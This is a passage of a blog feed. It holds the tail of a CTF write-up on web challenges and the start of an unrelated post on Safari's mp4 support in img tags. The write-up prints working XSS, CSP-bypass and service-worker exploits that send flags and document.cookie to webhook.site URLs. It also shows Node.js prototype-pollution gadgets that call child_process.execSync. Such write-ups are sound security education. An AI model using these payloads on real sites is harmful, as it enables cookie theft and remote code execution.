be blocked by CSP:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  <span class="token keyword">const</span> js_url <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">http://</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>req<span class="token punctuation">.</span>hostname<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">:</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token constant">PORT</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">/js/index.js</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>  res<span class="token punctuation">.</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'Content-Security-Policy'</span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">default-src </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>js_url<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string"> 'unsafe-eval';</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>By creating a response with a header that is too large and embedding it in an iframe, you can obtain a same-origin page without CSP, bypassing CSP:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> f<span class="token operator">=</span>document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'iframe'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>f<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">http://localhost:3000/js/index.js?q=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token string">'a'</span><span class="token punctuation">.</span><span class="token function">repeat</span><span class="token punctuation">(</span><span class="token number">20000</span><span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">;</span>f<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        f<span class="token punctuation">.</span>contentWindow<span class="token punctuation">.</span><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'/flag'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">headers</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token string-property property">'X-FLAG'</span><span class="token operator">:</span> <span class="token string">'a'</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token literal-property property">credentials</span><span class="token operator">:</span><span class="token string">'include'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">res</span> <span class="token operator">=></span> res<span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">flag</span> <span class="token operator">=></span> location<span class="token operator">=</span><span class="token string">'https://webhook.site/2ba35f39-faf4-4ef2-86dd-d85af29e4512?q='</span><span class="token operator">+</span>flag<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Interestingly, using <code>window.open</code> does not work. It is said that window.open will redirect the error page to a place like <code>chrome://error</code>, so the origin becomes null.</p><p>The expected solution for this question is actually a service worker. It can be used under http + localhost to remove the CSP header by relying on the service worker.</p><p>Below is @DimasMaulana’s exploit:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> quotetarget <span class="token operator">=</span> <span class="token string">"http://localhost:3000"</span>webhook <span class="token operator">=</span> <span class="token string">"https://webhook.site/9a2fbf03-9a64-49d1-9418-3728945d5e10"</span>rmcsp <span class="token operator">=</span> <span class="token triple-quoted-string string">"""self.addEventListener("fetch", (ev) => &#123;    console.log(ev)    let headers = new Headers()    headers.set("Content-Type","text/html")    if (/\/js\//.test(ev.request.url))&#123;        ev.respondWith(new Response("&lt;script>fetch('/flag',&#123;headers:&#123;'X-FLAG':'1'&#125;,credentials:'include'&#125;).then(async r=>&#123;location='"""</span><span class="token operator">+</span>webhook<span class="token operator">+</span><span class="token triple-quoted-string string">"""?'+await r.text()&#125;)&lt;/script>",&#123;headers&#125;))    &#125;&#125;);console.log("registered2")document = &#123;&#125;document.getElementById = ()=>&#123;return &#123;innerText:"testing"&#125;&#125;"""</span>workerUrl <span class="token operator">=</span> <span class="token string">"/js/index.js?expr="</span><span class="token operator">+</span>quote<span class="token punctuation">(</span>rmcsp<span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">"navigator.serviceWorker.register('"</span><span class="token operator">+</span>workerUrl<span class="token operator">+</span><span class="token string">"');setInterval(()=>&#123;location='/js/test'&#125;,2000)"</span><span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>payload <span class="token operator">=</span> target<span class="token operator">+</span><span class="token string">"/js/..%2f?expr="</span><span class="token operator">+</span>quote<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3><span id="blink-14-solves">blink (14 solves)</span></h3><p>The core code for this question is as follows:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> <span class="token function-variable function">createBlink</span> <span class="token operator">=</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">html</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  <span class="token keyword">const</span> sandbox <span class="token operator">=</span> <span class="token function">wrap</span><span class="token punctuation">(</span>    <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#viewer"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">"iframe"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// I believe it is impossible to escape this iframe sandbox...</span>  sandbox<span class="token punctuation">.</span>sandbox <span class="token operator">=</span> sandboxAttribute<span class="token punctuation">;</span>  sandbox<span class="token punctuation">.</span>width <span class="token operator">=</span> <span class="token string">"100%"</span><span class="token punctuation">;</span>  sandbox<span class="token punctuation">.</span>srcdoc <span class="token operator">=</span> html<span class="token punctuation">;</span>  <span class="token keyword">await</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">resolve</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">(</span>sandbox<span class="token punctuation">.</span>onload <span class="token operator">=</span> resolve<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">const</span> target <span class="token operator">=</span> <span class="token function">wrap</span><span class="token punctuation">(</span>sandbox<span class="token punctuation">.</span>contentDocument<span class="token punctuation">.</span>body<span class="token punctuation">)</span><span class="token punctuation">;</span>  target<span class="token punctuation">.</span>popover <span class="token operator">=</span> <span class="token string">"manual"</span><span class="token punctuation">;</span>  <span class="token keyword">const</span> id <span class="token operator">=</span> <span class="token function">setInterval</span><span class="token punctuation">(</span>target<span class="token punctuation">.</span>togglePopover<span class="token punctuation">,</span> <span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token function">clearInterval</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">;</span>    sandbox<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>It is not possible to bypass the sandbox in the iframe, but the key is the line of code <code>setInterval(target.togglePopover, 400)</code>.</p><p>If <code>target.togglePopover</code> is a string, it can be used as an eval.</p><p>And <code>target</code> is <code>sandbox.contentDocument.body</code>, which can be used to DOM clobber <code>document.body</code> with <code>name</code>, and then clobber <code>togglePopover</code> to complete the task.</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>body</span> <span class="token attr-name">srcdoc</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>&lt;a id=togglePopover href=a:fetch(`http://webhook.site/2ba35f39-faf4-4ef2-86dd-d85af29e4512?q=$&#123;document.cookie&#125;`)>&lt;/a><span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3><span id="eeeeejs-12-solves">eeeeejs (12 solves)</span></h3><p>Unfortunately, I couldn’t solve this question even after trying for a long time QQ</p><p>The core code for this question is as follows:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> ejs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"ejs"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token punctuation">&#123;</span> filename<span class="token punctuation">,</span> <span class="token operator">...</span>query <span class="token punctuation">&#125;</span> <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>process<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>ejs<span class="token punctuation">.</span><span class="token function">renderFile</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> query<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>console<span class="token punctuation">.</span>log<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>You can control <code>filename</code> and <code>query</code>, and the goal is XSS.</p><p>The CSP is set to self, which means that as long as you create <code>&lt;script src=/&gt;</code> and construct a valid JS code, you can get the flag.</p><p>But another limitation here is that you can only read files under <code>src</code>, so your template is limited.</p><p>The solution is to use EJS options <code>openDelimiter</code>, <code>closeDelimiter</code>, and <code>delimiter</code> to let EJS parse the template in different ways.</p><p>Because in EJS, <code>&lt;%=</code> can output the content followed by it, and <code>&lt;%-</code> can output unescaped content. So my initial idea was to find a string that matches this pattern, but I only found half of it in the end. I could create <code>&lt;script&gt;</code>, but the attribute content would be encoded. I also found a valid way to generate JavaScript. In short, I couldn’t solve it in the end.</p><p>After the competition, when I looked at other people’s solutions, I realized that I forgot that this question calls node.js to output. The author’s solution is to set debug to true, which allows EJS to output src, and src will include the filename. Then you can use the property of the filename object to pass in any content.</p><p>Alternatively, you can directly put <code>console.log(src)</code> into the template.</p><p>For example, there is a piece of text as follows:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">if</span> <span class="token punctuation">(</span>opts<span class="token punctuation">.</span>debug<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>src<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>opts<span class="token punctuation">.</span>compileDebug <span class="token operator">&amp;&amp;</span> opts<span class="token punctuation">.</span>filename<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  src <span class="token operator">=</span> src <span class="token operator">+</span> <span class="token string">"\n//# sourceURL="</span> <span class="token operator">+</span> sanitizedFilename <span class="token operator">+</span> <span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// other codes</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>After doing this:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">ejs<span class="token punctuation">.</span><span class="token function">renderFile</span><span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>  <span class="token string-property property">'src'</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>    <span class="token literal-property property">helllo</span><span class="token operator">:</span> <span class="token string">'world'</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token literal-property property">settings</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>    <span class="token string-property property">'view options'</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>      <span class="token literal-property property">delimiter</span><span class="token operator">:</span> <span class="token string">' '</span><span class="token punctuation">,</span>      <span class="token literal-property property">openDelimiter</span><span class="token operator">:</span> <span class="token string">'if (opts.debug)'</span><span class="token punctuation">,</span>      <span class="token literal-property property">closeDelimiter</span><span class="token operator">:</span> <span class="token string">" if (opts.compileDebug &amp;&amp; opts.filename)"</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">r</span> <span class="token operator">=></span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>The output will be:</p><pre class="line-numbers language-none"><code class="language-none">&#123; helllo: &#39;world&#39; &#125;   &#123;    src &#x3D; src + &quot;\n&#x2F;&#x2F;# sourceURL&#x3D;&quot; + sanitizedFilename + &quot;\n&quot;;  &#125;  &#x2F;&#x2F; other codes<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>The reason for this is that after changing the delimiter, the above text is equivalent to:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span><span class="token operator">%</span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>src<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span> <span class="token operator">%</span><span class="token operator">></span> <span class="token punctuation">&#123;</span>    src <span class="token operator">=</span> src <span class="token operator">+</span> <span class="token string">"\n//# sourceURL="</span> <span class="token operator">+</span> sanitizedFilename <span class="token operator">+</span> <span class="token string">"\n"</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token comment">// other codes</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Therefore, it is equivalent to executing <code>console.log(src)</code>, so src will appear in the output.</p><h3><span id="node-ppjail-5-solves">node-ppjail (5 solves)</span></h3><p>This question allows you to pollute things on the prototype, and the value can be a function, but the problem is that you cannot pollute existing properties.</p><p>The solution is to trigger an error and then find out what the Node.js  will do, and then pollute the corresponding properties.</p><p>A simple example is:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">prepareStackTrace</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'pwn'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>Object<span class="token punctuation">.</span>toString<span class="token punctuation">.</span>arguments<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>The output is:</p><pre class="line-numbers language-none"><code class="language-none">pwn&#x2F;js&#x2F;pp.js:4Object.toString.arguments                ^[TypeError: &#39;caller&#39;, &#39;callee&#39;, and &#39;arguments&#39; properties may not be accessed on strict mode functions or the arguments objects for calls to them]Node.js v20.0.0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>As for how to find this attribute, it seems like a good choice to patch V8 by learning from <a href="https://blog.maple3142.net/2023/09/17/seccon-ctf-2023-quals-writeups/#sandbox">maple</a>.</p><p>The author has found two other methods, which are recorded here for future reference. The source is the <a href="https://blog.arkark.dev/2023/09/21/seccon-quals/">author’s writeup</a>:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">solve1</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span>    <span class="token comment"># Solution 1:</span>    <span class="token keyword">return</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token punctuation">&#123;</span>        <span class="token string">"__proto__"</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span>            <span class="token comment"># ref. https://github.com/nodejs/node/blob/v20.6.0/lib/internal/fixed_queue.js#L81</span>            <span class="token comment"># ref. https://github.com/nodejs/node/blob/v20.6.0/lib/internal/process/task_queues.js#L77</span>            <span class="token string">"1"</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span>                <span class="token string">"callback"</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span>                    <span class="token string">"__custom__"</span><span class="token punctuation">:</span> <span class="token boolean">True</span><span class="token punctuation">,</span>                    <span class="token string">"type"</span><span class="token punctuation">:</span> <span class="token string">"Function"</span><span class="token punctuation">,</span>                    <span class="token string">"args"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span>                        <span class="token string-interpolation"><span class="token string">f"console.log(global.process.mainModule.require('child_process').execSync('</span><span class="token interpolation"><span class="token punctuation">&#123;</span>command<span class="token punctuation">&#125;</span></span><span class="token string">').toString())"</span></span>                    <span class="token punctuation">]</span><span class="token punctuation">,</span>                <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">solve2</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span>    <span class="token comment"># Solution 2:</span>    <span class="token keyword">return</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token punctuation">&#123;</span>        <span class="token string">"__proto__"</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span>            <span class="token comment"># ref. https://github.com/nodejs/node/blob/v20.6.0/lib/internal/util/inspect.js#L1064</span>            <span class="token string">"circular"</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span>                <span class="token string">"get"</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span>                    <span class="token string">"__custom__"</span><span class="token punctuation">:</span> <span class="token boolean">True</span><span class="token punctuation">,</span>                    <span class="token string">"type"</span><span class="token punctuation">:</span> <span class="token string">"Function"</span><span class="token punctuation">,</span>                    <span class="token string">"args"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span>                        <span class="token string-interpolation"><span class="token string">f"console.log(global.process.mainModule.require('child_process').execSync('</span><span class="token interpolation"><span class="token punctuation">&#123;</span>command<span class="token punctuation">&#125;</span></span><span class="token string">').toString())"</span></span>                    <span class="token punctuation">]</span><span class="token punctuation">,</span>                <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>            <span class="token comment"># ref. https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Error/cause</span>            <span class="token string">"cause"</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token comment"># Cause an error</span>        <span class="token string">"toString"</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span>            <span class="token string">"caller"</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3><span id="deno-ppjail-2-solves">deno-ppjail (2 solves)</span></h3><p>Similar to the previous question, but this time we need to find a gadget for deno.</p><p>The gadget that the author found is <code>Object.prototype.return</code>.</p><p>Maple found <code>cause + circular.get</code>, and @parrot409 found <code>nodeProcessUnhandledRejectionCallback</code>.</p><p>For more detailed explanations, you can refer to maple’s writeup: <a href="https://blog.maple3142.net/2023/09/17/seccon-ctf-2023-quals-writeups/#deno-ppjail">https://blog.maple3142.net/2023/09/17/seccon-ctf-2023-quals-writeups/#deno-ppjail</a></p><h3><span id="hidden-note-1-solve">hidden-note (1 solve)</span></h3><p>This challenge is also interesting. It belongs to the type of XS leaks. There is a search function, but the search results filter out the flag.</p><p>The search result page can leak information through meta redirect, so we can see the result page. However, the flag has been removed from the result page. What else can we do?</p><p>During the search, the results are sorted first, and then the flag is removed. The sorting method used in this question is a stable sort when the number of elements is &lt;&#x3D; 12, and an unstable sort when the number of elements is &gt; 12.</p><p>Therefore, we can create exactly 12 notes with the content: <code>ECCON&#123;@|ECCON&#123;a|ECCON&#123;b|...</code></p><p>Suppose the flag is <code>SECCON&#123;abc&#125;</code>. When searching for <code>ECCON&#123;@</code>, because the total number is 12, it is a stable sort, and the order of the IDs on the search result page will not change.</p><p>But if we search for <code>ECCON&#123;a</code>, the result becomes 13, and it becomes an unstable sort, changing the order of the notes.</p><p>Therefore, by examining the content of the result page, we can determine whether the original search result was within 12 or more than 12, and use it as an oracle to leak the flag.</p><p>This solution is really cool and innovative! Both Ark, who created the challnenge, and maple, who solved it, are really amazing.</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;Both of these competitions had many interesting but challenging problems. I really learned a lot.&lt;/p&gt;
&lt;p&gt;Keyword list:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;nim json, null byte&lt;/li&gt;
&lt;li&gt;nim request smuggling&lt;/li&gt;
&lt;li&gt;js-yaml&lt;/li&gt;
&lt;li&gt;web worker&lt;/li&gt;
&lt;li&gt;blob URL&lt;/li&gt;
&lt;li&gt;meta redirect&lt;/li&gt;
&lt;li&gt;file protocol &amp;amp; .localhost domain&lt;/li&gt;
&lt;li&gt;sxg: Signed Exchanges&lt;/li&gt;
&lt;li&gt;431 CSP bypass&lt;/li&gt;
&lt;li&gt;DOM clobbering document.body&lt;/li&gt;
&lt;li&gt;ejs delimiter&lt;/li&gt;
&lt;li&gt;Node.js + Deno prototype pollution gadget&lt;/li&gt;
&lt;li&gt;XSleaks golang sort&lt;/li&gt;
&lt;/ol&gt;</summary>
    
    
    
    <category term="Security" scheme="https://blog.huli.tw/categories/Security/"/>
    
    
    <category term="Security" scheme="https://blog.huli.tw/tags/Security/"/>
    
  </entry>
  
  
  
  <entry>
    <title>TIL:img src also supports mp4 (Safari only)</title>
    <link href="https://blog.huli.tw/2023/09/11/en/mp4-in-img-src/"/>
    <id>https://blog.huli.tw/2023/09/11/en/mp4-in-img-src/</id>
    <published>2023-09-11T13:10:00.000Z</published>
    <updated>2023-09-11T13:36:55.327Z</updated>
    
    <content type="html"><![CDATA[<p>Some websites use GIFs for certain images because they are animated and appear more impressive than static images. Sometimes, the need for an animated image arises, such as in the case of stickers where animation is expected.</p><p>However, one of the well-known drawbacks of GIFs is their large file size. Especially on mobile devices with higher resolutions, larger images are required. Even if only a 52px image is displayed, a 156px image needs to be prepared, resulting in increased file size. In terms of web development, it is always better to have fewer and smaller resources to load.</p><span id="more"></span><p>Therefore, many websites have started using the <code>&lt;video&gt;</code> tag to display these animated images. By converting them to the mp4 format, the file size can be significantly reduced. However, there are some downsides to using the <code>&lt;video&gt;</code> tag instead of <code>&lt;img&gt;</code>, such as the lack of native support for lazy loading and other inconveniences.</p><p>During my research, I unexpectedly discovered that Safari actually supports mp4 in the <code>&lt;img&gt;</code> tag! This means you can do the following:</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>test.mp4<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>This feature has been available since 2017: <a href="https://bugs.webkit.org/show_bug.cgi?id=176825">Bug 176825 - [Cocoa] Add an ImageDecoder subclass backed by AVFoundation</a></p><p>I found out about this in the following article: <a href="https://calendar.perfplanet.com/2017/animated-gif-without-the-gif/">Evolution of &lt;img&gt;: Gif without the GIF</a></p><p>If <code>&lt;img&gt;</code> can also support mp4, we can take advantage of the benefits of both tags without having to switch tags. We can have lazy loading support and significantly reduce the file size.</p><p>Unfortunately, this feature is only supported in Safari. Even after six years, I haven’t seen this functionality in Chromium or Firefox, and it seems unlikely to be implemented in the future.</p><p>Chromium has explicitly stated that it will not support this feature. The discussion thread can be found here: <a href="https://bugs.chromium.org/p/chromium/issues/detail?id=791658">Issue 791658: Support &lt;img src&#x3D;”*.mp4”&gt;</a>. It was marked as “Wont fix” in 2018, with the following reason:</p><pre class="line-numbers language-none"><code class="language-none">Closing as WontFix per c#35, due to the following:- The widespread adoption of WebP (addresses CDN use case)- Forthcoming AV1 based image formats (ditto).- Memory inefficiency with allowing arbitrary video in image.- Most sites have already switched to &lt;video muted&gt; now that autoplay is allowed.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>The first point mentioned that WebP actually has an Animated WebP format that can be used within the <code>&lt;img src&gt;</code> tag and is also animated. It has even smaller file sizes. For more information on the pros and cons, you can refer to Google’s own documentation: <a href="https://developers.google.com/speed/webp/faq?hl=en#why_should_i_use_animated_webp">What are the benefits of using animated WebP?</a></p><p>The second point mentions that the newer image format AVIF also has Animated AVIF, which also supports animated images.</p><p>If these new image formats can replace GIFs, it seems that there is no real need to use mp4.</p><p>As for Firefox, although they haven’t explicitly stated that they won’t implement this feature, the issue hasn’t seen much activity for a long time: <a href="https://bugzilla.mozilla.org/show_bug.cgi?id=895131">Add support for video formats in &lt;img&gt;, behaving like animated gif</a></p><p>Some people hope to add this feature to the specification, but there hasn’t been much progress for a while: <a href="https://github.com/whatwg/html/issues/7141">Require img to be able to load the same video formats as video supports #7141</a></p><p>In conclusion, it seems that this feature will only be available in Safari.</p><p>Unfortunately, the image service I am using only supports converting GIFs to mp4 and does not support converting to animated WebP or animated AVIF, which would have been very convenient.</p><h2><span id="summary">Summary</span></h2><p>If you want to continue using <code>&lt;img&gt;</code> for animated images, the most comprehensive approach would be to use the <code>&lt;picture&gt;</code> tag with multiple file formats, like this:</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>picture</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>source</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>image/avif<span class="token punctuation">"</span></span> <span class="token attr-name">srcset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>test.avif<span class="token 